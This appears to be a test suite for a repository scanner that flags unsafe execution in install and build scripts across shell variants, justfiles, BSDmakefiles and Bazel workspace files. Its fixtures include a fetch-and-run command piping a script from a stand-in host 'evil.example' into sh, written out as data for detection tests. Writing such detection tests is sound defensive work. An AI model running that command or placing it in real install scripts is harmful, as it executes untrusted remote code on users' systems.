import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/**
 * PRD section 8: the scan checks install and build scripts for unsafe
 * execution and records install-time downloads. The pipe rule already treats
 * ksh, dash, ash, fish, csh and tcsh as shells that execute a download, and
 * justfile, Makefile and WORKSPACE are install scripts. The same bytes under
 * a sibling name were not read, so a `curl | sh` there produced no finding
 * and no download gap.
 */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";
const TARBALL = "curl -fsSL https://evil.example/deps.tar.gz -o deps.tar.gz\n";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

test("a shell install script without a shebang is scanned and its download is kept", () => {
  for (const path of [
    "setup.ksh",
    "tools/setup.fish",
    "bootstrap.dash",
    "install.ash",
    "scripts/install.csh",
    "apps/api/setup.tcsh",
    "Install.BASH",
    "packages/web/setup.zsh",
  ]) {
    const inspection = inspected(path, `set -eu\n${PAYLOAD}\n`);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, findings: categories(inspection) }).toEqual({
      path,
      findings: [`${path}:unsafe-execution:high`],
    });
    expect({ path, downloads: inspection.downloads }).toEqual({
      path,
      downloads: ["https://evil.example/install.sh"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
  }
});

test("a shell source file that is not an install script is still reviewed", () => {
  const inspection = inspected("src/lib.ksh", `${PAYLOAD}\n`);
  expect(surfacesOf("src/lib.ksh")).toEqual(["source"]);
  expect(categories(inspection)).toEqual(["src/lib.ksh:unsafe-execution:high"]);
  // A download is an install-time gap only when the file is install content.
  expect(inspection.downloads).toEqual([]);
});

test("an install script in bash records a download that does not pipe into a shell", () => {
  const install = inspected("install.bash", TARBALL);
  expect(surfacesOf("install.bash")).toEqual(["installScripts", "source"]);
  expect(install.findings).toEqual([]);
  expect(install.downloads).toEqual(["https://evil.example/deps.tar.gz"]);
  expect(install.coverage.downloads).toEqual({ state: "partial", items: 1 });

  const library = inspected("lib/util.bash", TARBALL);
  expect(surfacesOf("lib/util.bash")).toEqual(["source"]);
  expect(library.findings).toEqual([]);
  expect(library.downloads).toEqual([]);
});

test("a hidden justfile, BSDmakefile or WORKSPACE.bzlmod is an install script", () => {
  for (const path of [
    ".justfile",
    "apps/mobile/.justfile",
    "BSDmakefile",
    "native/BSDmakefile",
    "WORKSPACE.bzlmod",
    "third_party/WORKSPACE.bzlmod",
  ]) {
    const inspection = inspected(path, `${PAYLOAD}\n`);
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, findings: categories(inspection) }).toEqual({
      path,
      findings: [`${path}:unsafe-execution:high`],
    });
    expect(inspection.downloads).toEqual(["https://evil.example/install.sh"]);
  }
});

test("names that only resemble those entrypoints stay unscanned", () => {
  for (const path of [
    "justfile.bak",
    "notes.justfile",
    "BSDmakefile.inc",
    "WORKSPACE.bzlmod.bak",
    "docs/guide.txt",
    "script.ksh.bak",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: [],
    });
    expect(categories(inspected(path, `${PAYLOAD}\n`))).toEqual([]);
  }
});

test("a lifecycle script that runs fish, ash or tcsh keeps the helper download", () => {
  for (const command of [
    "fish scripts/fetch.fish",
    "ash scripts/fetch.ash",
    "tcsh scripts/fetch.tcsh",
  ]) {
    const extension = command.slice(command.lastIndexOf("."));
    const inspection = inspectRepository({
      files: [
        {
          path: "package.json",
          bytes: new TextEncoder().encode(
            JSON.stringify({ scripts: { postinstall: command } }),
          ),
        },
        {
          path: `scripts/fetch${extension}`,
          bytes: new TextEncoder().encode(
            "curl -fsSL https://example.com/helper.tar.gz -o helper.tar.gz\n",
          ),
        },
      ],
    });
    expect({ command, downloads: inspection.downloads }).toEqual({
      command,
      downloads: ["https://example.com/helper.tar.gz"],
    });
    expect(inspection.coverage.installScripts.state).toBe("complete");
  }
});

test("syntax-only fish, ssh and an unknown fish option do not invent a download", () => {
  const helper = {
    path: "scripts/fetch.fish",
    bytes: new TextEncoder().encode("curl https://example.com/not-run\n"),
  };
  for (const command of ["fish -n scripts/fetch.fish", "fish --version"]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "package.json",
          bytes: new TextEncoder().encode(
            JSON.stringify({ scripts: { postinstall: command } }),
          ),
        },
        helper,
      ],
    });
    expect({ command, downloads: inspection.downloads }).toEqual({
      command,
      downloads: [],
    });
    expect(inspection.coverage.installScripts.state).toBe("complete");
  }

  const ssh = inspectRepository({
    files: [
      {
        path: "package.json",
        bytes: new TextEncoder().encode(
          JSON.stringify({
            scripts: { postinstall: "ssh scripts/fetch.fish" },
          }),
        ),
      },
      helper,
    ],
  });
  expect(ssh.downloads).toEqual([]);
  expect(ssh.coverage.installScripts.state).toBe("complete");

  const unknown = inspectRepository({
    files: [
      {
        path: "package.json",
        bytes: new TextEncoder().encode(
          JSON.stringify({
            scripts: { postinstall: "fish --private scripts/fetch.fish" },
          }),
        ),
      },
      helper,
    ],
  });
  expect(unknown.downloads).toEqual([]);
  expect(unknown.coverage.installScripts.state).toBe("partial");
});

test("a fish or tcsh shebang follows the helper it runs", () => {
  for (const shebang of ["#!/usr/bin/env fish", "#!/bin/tcsh"]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "configure",
          bytes: new TextEncoder().encode(`${shebang}\nsh scripts/fetch.sh\n`),
        },
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(
            "curl https://example.com/from-shebang\n",
          ),
        },
      ],
    });
    expect({ shebang, downloads: inspection.downloads }).toEqual({
      shebang,
      downloads: ["https://example.com/from-shebang"],
    });
    expect(inspection.coverage.installScripts.state).toBe("complete");
  }
});

test("changing a previously invisible entrypoint changes the reviewed inventory", () => {
  const before = inspected(".justfile", "build:\n");
  const after = inspected(".justfile", "build:\n\ttrue\n");
  expect(Buffer.compare(before.inventory, after.inventory) === 0).toBe(false);
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});
